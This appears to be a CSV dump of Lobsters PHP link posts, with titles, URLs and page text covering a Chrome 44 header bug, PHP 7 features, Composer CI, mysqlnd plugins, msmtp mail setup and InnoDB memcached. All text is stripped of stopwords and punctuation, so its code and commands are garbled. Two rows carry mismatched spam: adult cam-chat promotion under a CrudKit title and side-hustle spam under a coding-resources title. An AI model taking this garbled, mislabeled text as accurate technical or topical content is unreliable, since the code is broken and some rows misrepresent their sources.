209,Lobsters,php,PHP programming,"Chrome 44 Sending HTTPs Header By Mistake, Breaking (Some) Web Applications",https://ma.ttias.be/chrome-44-sending-https-header-by-mistake-breaking-web-applications-everywhere/,chrome sending http header mistake breaking web application,update le worse looked see detail update chrome got updated httpsheader gone see detail interesting issue forcing wordpress site use http even directed going fun week chrome user fixing woocommerce specifically rahul lohakare update chrome got updated replaced http upgradeinsecurerequests,update le worse looked see detail update chrome got updated httpsheader gone see detail interesting chrome release version happened yesterday appears browser got small bug significant change sending http header every request default probably meant security improvement suggest http server wherever possible breaking wordpress webserver installation place php software us server http detect site running behind ssl certificate includes wordpress drupal custom php software check header server http server httphttps assume http redirect enable http prefix resource cssjsimages next planned release chrome scheduled july investigating emergency patch sent resolve issue bugtracker issue forcing wordpress site use http even directed going fun week chrome user request header browser sends along get prefixed http server global variable useragent get transformed httpuseragent acceptheader get turned httpaccept http header look like according php printr server array http httphost mattiasbe httpaccept texthtml applicationxhtmlxml applicationxml imagewebp httpacceptencoding gzip deflate sdch httpacceptlanguage nlnl nl enus en fr httpcookie somevalue httphttps httpuseragent first http value server variable one set webserver indicate http second one httphttps httpsheader sent chrome browser get transformed variable php php code like woocommerce wordpress plugin check server http also looked server httphttps detect http site wrong php code nothing bad php design http prefix handling done woocommerce probably done result apache bugfeature existed http rewrite environment variable would always get prefixed another http keyword also reverse proxy configs nginx varnish also pas environment variable along get interpreted apache header thus receive http prefix either way plugins update go site update plugins chance problem gone even chrome take couple day get patch fixing woocommerce specifically problem reported woocommerce wordpress plugin since chance log wordpress need another fix many thanks rahul lohakare comment fix modify following file either download via ftp upload modify directly server wpcontentpluginswoocommercewoocommercephp comment line isset server http empty server httphttps server http server httphttps commented prefix every line woocommercewordpress redirect anymore still work use firefox another browser log site update plugin via official wordpress update method since problem chromeonly bypass redirect using browser temporarily update chrome got updated replaced http upgradeinsecurerequests chrome pushed update everyone get hour version anything higher problem anymore update http header removed upgradeinsecurerequest header good news everyone
210,Lobsters,php,PHP programming,CrudKit: Open source CRUD framework. It's like Django Admin for PHP,http://crudkit.com,crudkit open source crud framework like django admin php,click see best tamil chat indian chat learn erotic live chatting along indian model sexual video chatting along indian wife,click see best tamil chat want hang around beautiful woman chance prepare go take lot time effort furthermore take lot energy end may come home alone without success would go effort use internet talk beautiful girl taste nowadays internet allows u talk kind woman desire matter fetish desire definitely find someone talk looking watch talk beautiful indian girl let tell website find large selection indian cam indian sex cam provides large selection indian cam girl watch give feedback indian webcam service provided taratrustindiacom dating website indian chat website provides ability get indian live chat room find girl dream chat either hidden nickname enjoy talk meet real sexy indian girl later meet real life want meet real life opt indian cam chat room see indian girl nasty hot staff webcam still talk send message like asking woman something want see maybe talk dirty enjoy taratrustindiacom create account easy create creating online profile able access indian webcam form anywhere world webcam streaming high quality without stuttering enjoy show seamlessly like particular indian girl worry may choose girl large selection taratrustindiacom find largest selection indian girl cam web matter going go website still broad selection go try taratrustindiacom today see awesome info indian cam chat learn video erotic live chatting along indian modelssexual video chatting along indian wife
211,Lobsters,php,PHP programming,DRY is about Knowledge,http://verraes.net/2014/08/dry-is-about-knowledge/,dry knowledge,dry knowledge code duplication issue mathiasverraes reason change knowledge read mathiasverraes,dry knowledge code duplication issue published august mathiasverraes look two class php example final class basket private product public function addproduct product count product throw new exception max product allowed product product final class shipment private product public function addproduct product count product throw new exception max product allowed product product would say duplicate code violate dry principle aka repeat solution get rid could something like php example abstract class productcontainer protected product public function addproduct product count product throw new exception max product allowed product product final class basket extends productcontainer final class shipment extends productcontainer code identical good domaindriven design practitioner check business product could flammable chemical safety concern shipment allowed three consequence allow customer order three time another scenario similarity code might also simple coincidence maybe supply product limited want give customer equal opportunity buy reason change whatever case matter problem rule might change independently business might realize still sell three product time divide product multiple shipment example stuck high coupling type domain object business rule indirectly changing rule basket change rule shipment potentially dangerous consequence real world example course blatantly simple refactor legacy code usually lot harder might tempted solve problem abstracting limit php example abstract class productcontainer protected product public function addproduct product getproductlimit count product throw new exception sprintf max product allowed getproductlimit product product abstract protected function getproductlimit work certain extent rule might change unexpected way example assumes limit always easy determine single method call new rule might take account customer history company certain legal condition promotion etc new rule dynamically influence number product buy way modelled using abstract addproduct method knowledge business rule example max product allowed fact two business rule basket allowed three product shipment allowed three product two rule matter similar two individual representation model repeat never code knowledge cohesion two piece code represent exact knowledge always change together change risky might forget one hand two identical piece code represent different knowledge change independently deduplicating introduces risk changing knowledge one object might accidentally change object looking reason change powerful modelling heuristic read follow post post domaindriven design follow mathiasverraes twitter
212,Lobsters,php,PHP programming,Composer & Continuous Integration,https://blog.engineyard.com/2015/composer-continuous-integration,composer continuous integration,need testing using lock file test,automated testing widely used identify regression library application different environment varying configuration matter whether employ testdriven development set acceptance test behaviourdriven development use suite functional test ensure application work expect goal automated testing quickly provide engineer reliable information potential problem continous integration ci practice continuously automatically testing every change developer make automated test become integral part development process providing direct feedback change made need testing traditionally php project build process php compiled language need however advancement frontend development build process common aspect modern web project minified modularised javascript cs preprocessors using composer manage php library usually addition existing build process php library may previously needed build process testing integration dependency requires installing dependency composer get highest quality feedback automated test environment test run match target environment closely possible application mean ideally share provisioning code eg chef puppet ansible etc production testing environment also ensure version installed software match library try cover supported platform many different configuration possible using lock file test davey shafik article composer lock file explains typical usage composer install update key takeaway developer run composer update manually explicitly update individual dependency composer install used automated process principle includes automated test environment using composer install lock file reproduce vendor directory exactly way production environment greatly reduces risk overlooking application bug introduced minor patch release update dependency library usually single target platform could try reproduce closely test nevertheless following principle checking composerlock file library repository advantage automated test fail certain failure result installing dependency different version one used locally user run test platform submit bug report certain issue result platform installed version dependency explicitly document precise version testing composerlock file repository version history document change developing library may explicitly want support test multiple version dependency example symfony bundle usually support multiple version symfony framework rather trying detect bug randomly user use different version lock file repository explicitly swap dependency different version using composer require predefined list version would like run test suite require command update composerjson file run composer update somedependency even case rest lock file remains unaltered giving advantage listed note lot library currently use composer require noupdate described call composer install effect library fail provide lock file composer install actually run full composer update give certainty version get installed div div composer also offer new preferlowest option composer update attempt install lowest version dependency still match version constraint specified composerjson flag helpful ensuring library actually work minimum requirement improving build performance difficult integrate continuous build development process build process take long time nt deliver direct feedback hence performance individual build important successful use ci fortunately using right option running composer improve performance lot apart advantage already discussed installing dependency lock file significantly faster running composer update package metadata stored lock file composer install immediately start downloading actual dependency instead loading metadata calculating dependency information composer keep local cache cache consists two main component copy downloaded file reused avoid unnecessary waiting time dependency downloaded copy package metadata need loaded repository like packagist calculate dependency cache need remain build effective sharing data build accomplished depends tool use run automated test travis ci popular ci service open source php library configure caching keep composer metadata another option vagrant cachier plugin used share composer cache vagrant box improving performance reprovisioning default composer run dev mode dev mode mean dependency listed requiredev installed also mean composer prefer cloning repository downloading archive helpful development directly make commit change within vendor directory however testing use preferdist download package archive usually faster cloning entire repository may prefer use nodev automated test closely match production environment would mean rely testing tool installed requiredev dependency list time requiredev package influence dependency resolution package require even install requiredev package test environment dependency match exact version production environment lastly optimizeautoloader option creates faster version composer autoloader take longer generate result faster class file lookup option always helpful production environment may improve overall performance automated test well conclusion continous integration project using composer improved consistent use composerlock library carefully reviewing different option available composer install allows speed build time provide developer direct feedback build additionally use composer require explicitly test various version dependency without modifying rest composerlock p think post got question tip share let u know sharing comment http enwikipediaorgwikitestdrivendevelopment http enwikipediaorgwikibehaviordrivendevelopment http wwwengineyardcomblogcomposeritsallaboutthelockfile http docstraviscicomusercaching http fgrehmviewdocsiovagrantcachier http travisciorg
213,Lobsters,php,PHP programming,Comparing the PHP 7 and Hack Type Systems,http://www.dmiller.io/blog/2015/4/26/comparing-the-php7-and-hack-type-systems,comparing php hack type system,written hack,loggerphp defined strict mode yet php allows u pas int nonstrict mode file hhvm throw exception scenario happens make addphp strict fatal error argument passed mylog must type string integer given called homevagrantseparatefilesmixedaddphp line defined homevagrantseparatefilesmixedloggerphp line better look like function defined strict file strictly type checked calling code also defined strict file flip side happens call nonstrict function type annotated strict function test changed loggerphp nonstrict made addphp strict fatal error argument passed mylog must type string integer given called homevagrantseparatefilesmixedaddphp line defined homevagrantseparatefilesmixedloggerphp line appears function strictly type checked called function defined file declared strict however affect direct child call file declared strict declare mainphp strict php happily return despite mismatched type passing log hack relationship reversed hhvm executes mainphp nonstrict mode logger written hack hh tag top file still get type error despite fact file making call written hack catchable fatal error argument passed mylog must instance string int given homevagrantseparatefilesmixedloggerphp line another interesting difference hack php type system come php handling float annotation take code example
214,Lobsters,php,PHP programming,"What to Expect When You're Expecting: PHP 7, Part 2",https://blog.engineyard.com/2015/what-to-expect-php-7-2,expect expecting php part,read part one first part series unicode codepoint escape syntax null coalesce operator null coalesce operator bind closure call group use declaration group use declaration generator improvement generator return expression generator return expression generator delegation generator delegation engine exception engine exception coming soon test code php vagrant box bug help project write documentation phpnet wiki online gui environment summary,part two expecting php miniseries read part one probably already know php thing coming year make good time go new improved first part series looked important inconsistency fix coming php well two biggest new feature post take look another six big feature land php want know unicode codepoint escape syntax addition new escape character u allows u specify unicode character code point hexidecimal unambiguously inside php string syntax used u codepoint example green heart expressed php string u null coalesce operator another new operator null coalesce operator effectively fabled ifsetor return left operand null otherwise return right important thing raise notice left operand nonexistent variable like isset unlike short ternary operator also chain operator return first nonnull given set config config config static defaultconfig bind closure call php saw addition closure bindto closure bind allows change binding calling scope together separately creating duplicate closure php add easy way call time binding calling scope object addition closure call method take object first argument followed argument pas closure like class helloworld private greeting hello closure function echo greeting obj new helloworld closure call obj world hello world group use declaration ever import many class namespace probably happy ide autocomplete others brevity php group use declaration allows quickly specify many similar import better clarity original use frameworkcomponentsubcomponentclassa use frameworkcomponentsubcomponentclassb classc use frameworkcomponentothercomponentclassd group use use frameworkcomponent subcomponentclassa subcomponentclassb classc othercomponentclassd also used constant function import use function use const well supporting mixed import use frameworkcomponent subcomponentclassa function othercomponentsomefunction const othercomponentsomeconstant generator improvement generator return expression two new feature added generator first generator return expression allows return value upon successful completion generator prior php tried return anything would result error however call generator getreturn retrieve return value generator yet returned thrown uncaught exception calling generator getreturn throw exception generator completed return null returned example function gen yield hello yield yield world return goodbye moon gen gen foreach gen value echo value output hello iteration iterator world iteration echo gen getreturn goodbye moon generator delegation second feature much exciting generator delegation allows return another iterable structure traversed whether array iterator another generator important understand iteration substructure done outermost original loop single flat structure rather recursive one also true sending data exception generator passed directly onto substructure controlled directly call done using yield expression syntax like function hello yield hello yield yield world yield goodbye function goodbye yield goodbye yield yield moon gen hello foreach gen value echo value iteration output hello world goodbye moon one caveat worth mentioning substructure yield key entirely possibly key returned multiple iteration responsibility avoid matter engine exception handling fatal catchable fatal error traditionally impossible least difficult php addition engine exception many error throw exception instead fatal catchable fatal error occurs throw exception allowing handle gracefully handle result traditional fatal error uncaught exception exception engineexception object unlike userland exception extend base exception class ensure existing code catch exception class start catching fatal error moving forward thus maintains backwards compatibility future wish catch traditional exception engine exception need catch new shared parent class baseexception additionally parse error eval ed code throw parseexception type mismatch throw typeexception example try nonexistentfunction catch engineexception e vardump e object engineexception message protected string call undefined function nonexistantfunction string baseexception private string code protected int file protected string engineexceptionsphp line protected int trace baseexception private array previous baseexception private null coming soon php eight month away making quite possibly quickest major version php history still alpha quality php shaping really nicely help make better test code grab rasmus php vagrant box start running test suite performing regular qa report bug project try regularly help one major hurdle php ensuring extension updated work new zend engine use extension well known get much love maintainer extension check project get involved making sure everything ready go day one write documentation every new feature php rfc found phpnet wiki good starting point writing new documentation online gui environment including commiting karma submitting patch review summary php going great go test application help migrate extension p already playing around php feel new feature anything disagree wish made think making switch let u know thought
216,Lobsters,php,PHP programming,"What to Expect When You're Expecting: PHP 7, Part 1",https://blog.engineyard.com/2015/what-to-expect-php-7,expect expecting php part,read part two php timeline php timeline inconsistency fix abstract syntax tree uniform variable syntax performance phpng backwards incompatible change catchable fatal error trying call method nonobject removal deprecated functionality new feature scalar type hint return type scalar type hint return type hint hack combined comparison operator combined comparison operator next,part one expecting php miniseries read part two many probably aware rfc mentioned php timeline passed php agreed upon name next major version php regardless feeling topic php thing coming year rfc php timeline passing almost unanimously entered feature freeze see first release candidate rc appearing mid june mean seen huge reluctance web host move towards newer version major version bring huge backwards compatibility break make move even slower answer depends keep reading number language edge case cleaned additionally performance inconsistency fix major focus release let get detail inconsistency fix unfortunately needlehaystack issue fixed however two major rfcs passed bring muchneeded internal userland consistency largest invisible addition abstract syntax tree ast intermediate representation code compilation place able clean edge case inconsistency well pave way amazing tooling future using ast produce performant opcodes second introduction uniform variable syntax may cause issue solves numerous inconsistency expression evaluated example ability call closure assigned property using object closureproperty well able chain static call like class foo static bar baz class baz static bat hello world baz bat function echo hello world foo foo foo bar bat however semantics also changing particular semantics using variablevariablesproperties prior php obj property name would access property whose name name key property array universal variable syntax would access name key property whose name resides property concise take statement obj property name would interpreted obj property name php obj property name use variablevariables generally edgecase frowned upon variableproperties much le uncommon experience however easily work around application curly brace illustration ensure behavior php performance biggest reason upgrading php performance brought primarily change introduced phpng performance increase may fact ensure quick adoption especially smaller host would normally able host customer hardware thing currently stand depending whose benchmark see performance php par facebooks hhvm feature time jit compiler compiles php code way machine instruction able php feature jit though discussed lot unclear performance gain addition one sure interesting see someone decides create one addition performance substantial memory saving optimization internal data structure one primary way performance improvement achieved backwards incompatible change internals developer tried hard break backwards compatibility bc always possible moving language forward however like bc break introduced uniform variable syntax minor catchable fatal error trying call method nonobject seterrorhandler function code message vardump code message var null var method echo e getmessage fatal error call member function method null echo hello world still run additionally asp script tag removed meaning longer use script language php respective close tag script much larger change however found removal deprecated functionality importantly removal posix compatible regular expression extension extereg deprecated old extmysql extension deprecated one minor bc breaking change disallowing multiple default case switch prior php following allowed switch expr default echo hello world break default echo goodbye moon break would result latter executed php result fatal error switch statement may contain one default clause new feature begrudgingly deal effect backwards incompatibility appreciate performance revel new feature new feature make release fun php short new feature scalar type hint return type going start controversial change added php scalar type hint addition feature involved vote almost passed author left php developement good withdrawing rfc followed multiple rfcs competing implementation whole lot public fighting ultimately ended effectively original rfc passed endusers mean typehint scalar type specifically int float string bool default typehints nonstrict mean coerce original type type specified typehint mean pas int function requires float come float passing float function requires int come int example function sendhttpstatus int statuscode string message header statuscode message sendhttpstatus file found integer string passed sendhttpstatus ok string coerced int additionally enable strict mode placing declare top given file ensure function call made file strictly adhere type specified strict determined file call function made file function defined typehint mismatch occurs catchable fatal error thrown php declare must first line sendhttpstatus file found integer string passed sendhttpstatus ok catchable fatal error argument passed sendhttpstatus must type integer string given furthermore php also support return type hint support type argument follow syntax hack suffixing argument parenthesis colon followed type function isvalidstatuscode int statuscode bool return isset status statuscode example bool indicates function return boolean rule apply typehints apply returned type hint strict mode combined comparison operator personal favorite addition php addition combined comparison operator otherwise known spaceship operator might biased wrote initial patch influenced naming tspaceship operator still nice addition language complementing greaterthan lessthan operator effectively work like strcmp versioncompare returning left operand smaller right equal left greater right major difference used two operand string also integer float array etc common usage operator sorting callback pre spacefaringw php function orderfunc b return b b post php function orderfunc b return b next post taken look important inconsistency fix coming php looked two biggest new feature next post two part series take look six big feature coming php want know plus round series looking way get involved helping php effort p waiting share thing looking forward php maybe stuff disappointed making
218,Lobsters,php,PHP programming,HippyVM goes to Y Combinator and fails,http://lostinjit.blogspot.com/2015/03/hippyvm-goes-to-y-combinator-and-fails.html,hippyvm go combinator fails,hippyvm idea pypy rpython nobody idea actual interview two aftermath postmortem,tl dr decided go combinator hippyvm high performance php implementation get two round interview suppose keep reading whole story started small disaster let start beginning applied combinator bit haphazardly summer batch without expecting interview get main reason apply precisely idea talk done paul graham pycon u keynote mentioning sufficiently smart compiler reader nt know pypy fast python compiler also developed language framework called rpython suitable implementing fast dynamic language decided check work php hippyvm born well thought framework close get day sufficiently smart compiler decided submit got combinator invitation europe time usual place residence south africa got ticket went airport turned visa u left home note u try admit fact keep visa information sort system get new passport either allowed use old passport need apply new visa way transfer new passport oh well fortunately part live century call dhls ticket later landed san francisco weekend interview scheduled saturday ended detained sfo since nobody fly sf weekend carrying two set clothes laptop sleeping bag idea idea simple enough expertise compiler hard thing php widely deployed dynamic language also people selling various php optimizers money nt really much better time hhvm really working well competition actual interview actually ended two set interview think pretty unusual first team probably confused sent u second one positive part interview people least use python generally recognize work negative part month far enough bring tangible result compiler world required year work provide anything tangible fit model paul buchheit asked u halfjokingly cool compiler guy europe far know true europe overrepresented nt answer time later day become blatantly obvious longterm vision compiler take time american typically sight pypy year old new kid block told home cranking code get something showable walked interview pretty sure would get aftermath unsurprisingly nt get ended good one day pypy sprint san francisco fit model brings interesting question lars bak told money infrastructure like programming language people willing invest company contender day open source without decent funding model backed large corpo oracle google microsoft idea go sponsoring research like pypy building business model around despite bringing lot value system nt mean pypy also cpython ruby etc seem good way build business model good reason want infrastructure either open source backed large stable entity much world better place coldfusion day better however missing business model infrastructure people get attention vcs revenue model somehow corresponds value bringing postmortem hippyvm got little funding beginning get u sort prototype within bit year point able run mediawiki significant speedup zend php however hhvm team day count people guess photo available free sure tied facebook seems enough deter business area would able outcompete hhvm enough usually enough faster real life workload fraction team fraction funding went onto improving pypy achieve hhvm small percentage cost difficulty funding generally caused hippyvm project come stall consulting pypyrelated pretty happy however still trying find model basic research infrastructure work provide revenue related amount value bringing company idea welcome
219,Lobsters,php,PHP programming,A Craft Redirect Plugin for Obsolete URLs,http://www.lacroixdesign.net/blog/craft-obsolete-url-redirect-plugin/,craft redirect plugin obsolete url,craft installation http githubcomlacroixdesigncraftobsoleteurlredirect caveat open source github send tweet,recent buildout craft website client wanted ability automatically redirect entry new url slug revised visitor landed old url example entry started url http examplecomfirst slug later changed make http examplecomsecond visiting first redirect user second developed plugin request return query recent revision path prefix defunct slug fetch current live revision entry redirect entry new url one thing note query intentionally isolated prefix example would redirect entry section different url prefix blog installation download plugin http githubcomlacroixdesigncraftobsoleteurlredirect unzip move obsoleteredirect folder craft plugins folder install via craft control panel would plugin finally add following snippet template file craftobsoleteredirectcheck caveat obviously need either craft client pro personal edition revision functionality additionally plugin track url change structural level eg changing blog section prefix blog news tested localized website testing feedback realm would greatly appreciated open source plugin free open source available github feel free open issue pull request send tweet feedback suggestion
220,Lobsters,php,PHP programming,Writing Custom Plugins for PHP’s MySQLnd,https://blog.engineyard.com/2015/writing-custom-plugins-for-php-mysqlnd,writing custom plugins php mysqlnd,previously written custom routing mysqlndms custom cache handler mysqlndqc instalation setup mysqlnduh proxy registering proxy creating proxy tying together earlier article series many feature mysqlnd plugins conclusion mysqlnduhconnection mysqlnduhpreparedstatement,previously written custom hook specific mysqlnd plugins like custom routing mysqlndms custom cache handler mysqlndqc time looking mysqlnduh user handler allows u write entire plugin mysqlnduh least stable mysqlnd plugins available alpha likely need compile source instalation setup first grab source code install svn co http svnphpnetrepositorypeclmysqlnduhtrunk mysqlnduh cd mysqlnduh phpize configure enablemysqlnduh make sudo make install add following phpini similar note must load mysqlnduh extension mysqlnd mysqlnduh proxy mysqlnduh plugin considered applicationlevel proxy application code mysql server two type proxy connection proxy prepared statement proxy implement must extend mysqlnduhconnection mysqlnduhpreparedstatement respectively code important understand class mysqlnd driver written c exposed directly php userland mean fail call parent method may cause php crash leak memory also number method mapped directly userland functionality eg mysqli pdomysql extension apis instead called internal underlying implementation registering proxy mysqlnduh extension expose two function register proxy mysqlnduhsetconnectionproxy connection proxy extending mysqlnduhconnection mysqlnduhsetstatementproxy statement proxy extending mysqlnduhpreparedstatement accepts instance proxy class mean must careful maintaining object state shared globally creating proxy create proxy simply extend appropriate class example want create proxy simply record every time mysql connection made create connection proxy extending mysqlnduhconnection like class connectionrecorderproxy extends mysqlnduhconnection public function connect connection host user password database port socket mysqlflags time time fileputcontents tmpconnectionlog connection host port port user user date r time phpeol return parent connect connection host user password database port socket mysqlflags override connect method add line log return result parent connect note may register one proxy type connection statement given time would fairly trivial write single proxy would allow register callback method however beyond scope article tying together saw earlier article series many feature mysqlnd plugins controlled using sql hint mysqlndms readwrite routing query caching hint available constant injected inside sql comment however injecting hint either printfsprintf concatenation inelegant messy instead write simple proxy automatically transform query replace string constant name value need add connection proxy catch query issued mysqli query pdo query statement proxy catch prepared query created mysqli prepare pdo prepare might look like utility class replacing sql hint class mysqlndpluginquerytransformer static public transform sql list constant replace constant mysqlndmsmasterswitch mysqlndmsslaveswitch mysqlndmslastusedswitch mysqlndqcenableswitch mysqlndqcdisableswitch mysqlndqcttlswitch replace hint foreach constant constant sql strreplace constant constant constant sql handle mysqlndqcttlswitch would double sql strreplace mysqlndqcttlswitch mysqlndqcttlswitch sql return sql connection proxy class class mysqlndpluginconnectionproxy extends mysqlnduhconnection public function query connection query transform query query mysqlndpluginquerytransformer transform query call return parent function transformed query return parent query connection query statement proxy class class mysqlndpluginstatementproxy extends mysqlnduhpreparedstatement public function prepare connection query transform query query mysqlndpluginquerytransformer transform query call return parent function transformed query return parent prepare connection query set proxy mysqlnduhsetconnectionproxy new mysqlndpluginconnectionproxy mysqlnduhsetstatementproxy new mysqlndpluginstatementproxy work first creating single simple class mysqlndpluginquerytransformer perform replacement first iterate constant string replace string value constant using constant function additionally mysqlndqcttlswitch constant contains equal sign left hint like select user readability want also allow following select user must check ensure remove extraneous sign create proxy class override mysqlnduhconnection query mysqlnduhpreparedstatement prepare method pas sql query mysqlndpluginquerytransformer transform method call parent new sql finally register proxy query transparently transformed change existing code issue query using one constant literally like mysqlndmsmasterswitch select user whether prepared statement literal mysqlndmsmasterswitch replaced automatically automatically becomes msmaster select user conclusion mysqlnduh powerful also simple expose one thing nothing unless tell given hook almost part connection query process extension unlimited monitoring statistic backwards compatibility layer name potentially possible however given extension alpha state recommended production use moment mean useless however thing like able detect report bad query dev eg issued nonexistant renamed table handy next step read php manual mysqlnduhconnection mysqlnduhpreparedstatement class give idea hook purpose p used mysqlnduh idea using love hear idea throw u comment
221,Lobsters,php,PHP programming,A Study in Craft — Developing an online publishing platform with a powerful CMS.,http://www.lacroixdesign.net/blog/a-study-in-craft/,study craft developing online publishing platform powerful cm,responsive website craft craft publishing user experience want monthly newsletter,recently opportunity build new responsive website client myriad short longterm goal many would evolve vision gained traction first objective build publishing platform would include multiple set content type isolated author access entry based user permission type content authorship additionally piece content needed relational component order easily reference throughout many facet website given initial requirement need accommodate array future unidentified feature immediately thought using craft used previously handful smaller project absolutely loved entire experience craft craft cm work wonderfully structured data make unnecessary assumption data used frontend provides head start supplying common feature needed publishing platform user account finegrained permission content entry draft versioning assortment builtin fieldtypes robust query builder routing pagination importantly powerful api extend functionality project specific need discussing future blog post publishing user experience important u enjoy building product craft even important client enjoy using cm thankfully client feedback previous project excellent navigating cm admin simple straightforward managing content extremely easy feature especially loved live preview feature display sidebyside view content entry page actual output visitor see notable content data entered feature craft render end result content change craft official promo video action live preview action really convenient want project created library extend craft functionality connect external service plan extract project open source coming week following blog post well tip craft configuration deployment check back subscribe monthly newsletter receive update everything considered craft wonderful choice project highly recommend taking look next endeavor certainly wait use
222,Lobsters,php,PHP programming,Learn How to Code With Online Resources – Free and Paid,http://webdesignpool.com/learn-programming-online,learn code online resource free paid,drive rideshare company uber lyft buy sell get return investment amazon post gig fiverr fiverr help business owner social medium seo cape town teach english nonnative speaker become pet sitterdog walker donate plasma,looking make extra cash without getting second job want make money without commitment probably looking flexible side hustle would work around schedule lot fun easy way earn money side even currently fulltime job check following seven unique side hustle worth try drive rideshare company working vehicle license could always work rideshare company uber lyft set schedule work often want may want spend weekend driving company people taking ride get want go however entirely neither rideshare company service expects driver work set time always option driving picking people many hour would like even car always use bicycle provide service ubereats doordash postmates working company would go restaurant grab food order deliver order directly customer great solution without vehicle would still like earn extra money buy sell get return investment know make decent money purchasing item clearance thrift store reselling need go local store walmart target look item clearance section also check thrift store area see find grabbing great item reasonable rate post online amazon ebay sell higher price get return investment post gig fiverr fiverr site allows post kind service offer individual example might large social medium following would willing post link video business owner get word product sell offer social medium promotion web design ebook formatting earn quick cash convenience help business owner social medium good social medium know naturally bring lot follower use skill help business owner many business owner time patience use social medium want work strengthening online presence offer provide social medium service help business owner get follower customer another variation help customer seo cape town get ranking key search term business need teach english nonnative speaker would like teach english people country several apps allow individual united state work remotely teaching child adult english different lesson plan set schedule work hour want making new friend around world become pet sitterdog walker love animal offer become pet sitter dog walker side becoming dog walker great get exercise spend time outdoors earning extra money offer watch pet people going away vacation business trip donate plasma one relaxing way earn extra cash donate plasma average person donate plasma twice week potentially earning week month painful take long complete donation process paid spot wait around cash need hundred extra dollar per month great side hustle want earn extra money best way fact participate several side hustle earn much want
223,Lobsters,php,PHP programming,Using Gmail SMTP Servers to Send Email From WordPress on DigitalOcean,https://longren.io/using-gmail-smtp-servers-to-send-email-from-wordpress-on-digitalocean/,using gmail smtp server send email wordpress digitalocean,use gmail smtp server sending email wordpress msmtp digitalocean post post install msmtp configure msmtp use gmail email protected email protected remove sendmail setup alias tell php msmtp email protected disable experience slowness comment digitalocean article done digitalocean well work get touch leave feedback leave comment like published twitter google github view post tyler longren published,use gmail smtp server sending email wordpress quite bit back forth sendmail postfix exim settled using msmtp sending email serversdroplets digitalocean affiliate link msmtp lightweight ability send email via existing smtp server like gmail yahoo get working trick pieced together post post digitalocean issue cause major delay sending email fix end post install msmtp sudo aptget install msmtp configure msmtp use gmail open etcmsmtprc root sudo nano etcmsmtprc add following removing whatever else gmailgoogle apps account gmail host smtpgmailcom port email protected user email protected password enterpasswordhere auth tl tlstrustfile etcsslcertscacertificatescrt default account use account default gmail want replace user directive valid gmail email address gmail account google apps email address work forget change enterpasswordhere actual password gmail account using save etcmsmtprc remove sendmail run sudo aptget remove sendmailbin setup alias lot software linux system us sendmail command instead using msmtp essentially invoking msmtp sendmail command run sudo ln usrbinmsmtp usrsbinsendmail sudo ln usrbinmsmtp usrbinsendmail sudo ln usrbinmsmtp usrlibsendmail tell php msmtp first locate phpini file used apache typically use php phpinfo function find location phpini file find sendmailpath phpini replace sendmailpath usrbinmsmtp able send mail using php mail function use gmail smtp server send email add php file access browser see work php mail email protected subject hi nthis email sent using php mail function print email successfully sent else print error occured disable experience slowness open etcgaiconf like sudo nano etcgaiconf look line look like precedence uncomment line remove save etcgaiconf explanation help found comment digitalocean article done run issue please leave comment best help may missed part guarantee work however work wonderfully digitalocean droplet running ubuntu pretty standard lamp stack able send email wordpress digitalocean well work available hire always taking new client big small got project idea like discus startup plan developer make happen get touch love see help leave feedback got question updated information releavant post please leave comment comment great way get help read reply nearly every comment let talk like like loading related published tyler longren hi tyler longren freelance web developer father two beautiful daughter car stereo enthusiast like php javascript wordpress git neat thing really love open source community find twitter google github personal blog view post tyler longren published january
224,Lobsters,php,PHP programming,Polr - URL shortening platform in vanilla PHP,https://project.polr.me/,polr url shortening platform vanilla php,contribute,contribute found bug good idea improving polr head polr github page create new ticket fork want chat fellow developer visit irc channel also directly add issue feature request issue tracker
225,Lobsters,php,PHP programming,Introduction to MySQL's Innodb Memcached Interface,https://blog.engineyard.com/2015/introduction-to-mysqls-innodb-memcached-interface,introduction mysql innodb memcached interface,installation official mysql apt repository creating memcache store using memcache interface using multiple collection using mysqlndmemcache plugin memcached extension writing replication memcache pool conclusion drastic innodb memcached engine performance gain upcoming mysql release,mysql memcachecompatible innodbbacked keyvalue store added mysql innodb memcache daemon give permanence innodb keyvalue data accessed via much faster optimized memcached protocol using skip query parser optimizer part engine unnecessary mysqlndmemcache transparently route query memcachecompatible interface installation default mysql package ship ubuntu trusty include memcache plugin use install official mysql apt repository debian wheezy ubuntu precise ubuntu trusty mysql later installed login mysql super user run source usrsharemysqlinnodbmemcachedconfigsql install plugin daemonmemcached soname libmemcachedso innodbmemcachedconfigsql several thing first create innodbmemcache database contains three table cachepolicies table contains policy determining get set delete flush command executed container table contains list table expose via memcache configoptions table contains memcache configuration option specifically multicolumn value separator default pipe tablemapdelimiter default period second command load actual plugin start memcache daemon within mysql ready start using plugin creating memcache store memcache engine set certain requirement table every innodb table automatically exposed instead must setup known collection collection name used refer via memcache map number column name name used refer collection via memcache dbschema database name dbtable database table name keycolumns column name containing key let plural fool single column valuecolumns column contain value specify comma separated value memcache column value separated pipe per configoptions table flag memcache flag set cascolumn ca value assigned memcache expiretimecolumn expiration time second never expire uniqueidxnameonkey name index place unique constraint key key primary key specify primary create data store create new database kvdata table kvstore create database kvdata use kvdata create table kvstore key varchar value varchar flag int ca bigint unsigned exp int primary key key engine innodb tell plugin container insert innodbmemcachecontainers name dbschema dbtable keycolumns valuecolumns flag cascolumn expiretimecolumn uniqueidxnameonkey value kvdata kvdata kvstore key value flag ca exp primary done may take short apply restart mysql using memcache interface innodb memcache interface running insert data like database table course via memcache protocol done hand using telnet using memcache protocol default minimum number operation data committed innodb determined daemonmemcachedwbatchsize setting mean data visible via mysql every operation performance tradeoff one exception rule using binlog replication always set mysql change available immediately via memcache must run set transaction isolation readuncommitted use interface using telnet need connect using telnet localhost telnet set testkey hello world stored telnet get testkey value testkey hello world end using multiple collection default data stored either collection named default exist first collection table access data different collection two option first closer mysql use statement simply get collection subsequent command connection performed collection changed collection name prefixed double sign distinguish telnet get kvdata value kvdata kvdatakvstore end alternatively personal preference someone also hate mysql table alias use fully qualified name tablemapdelimeter come play whereby prefix key collection tablemapdelimeter testkey becomes kvdatatestkey telnet get kvdatatestkey value kvdatatestkey hello world end recommend always using fully qualified name may accidentally change collection called code without realizing using mysqlndmemcache plugin point simply interface memcache interface using memcached memcache php extension including using default session handler memcached extension memcache extension using regular sql query however mysqlndmemcache plugin transparently route sql query memcache interface applicable default query matched regular expression exposed via mysqlndmemcachedefaultregexp constant selects froms wheres match plugin verifies column mapped collection setup single clause exists simple comparison key column example match select value kvstore key testkey however none would select kvstore key testkey select value kvstore key testkey value like foo select key kvstore value like foo query may issued using mysql mysqli pdo query execution mechanism intercepted transparently mysqlndmemcache plugin handle writes potentially limited 